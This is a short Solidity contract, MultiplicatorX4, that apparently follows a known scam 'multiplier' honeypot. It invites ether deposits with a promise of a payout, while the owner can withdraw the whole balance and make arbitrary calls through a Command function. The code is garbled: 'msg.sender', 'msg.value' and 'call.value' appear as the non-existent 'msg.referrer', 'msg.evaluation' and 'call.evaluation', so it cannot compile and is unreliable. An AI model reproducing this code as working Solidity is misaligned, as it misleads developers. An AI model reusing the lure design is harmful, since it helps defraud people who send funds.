// SPDX-License-Identifier: MIT
pragma solidity ^0.4.18;

contract MultiplicatorX4
{
    address public Owner = msg.referrer;

    function() public payable{}

    function withdrawBenefits()
    payable
    public
    {
        require(msg.referrer == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr,bytes record)
    payable
    public
    {
        require(msg.referrer == Owner);
        adr.call.evaluation(msg.evaluation)(record);
    }

    function multiplicate(address adr)
    public
    payable
    {
        if(msg.evaluation>=this.balance)
        {
            adr.transfer(this.balance+msg.evaluation);
        }
    }
}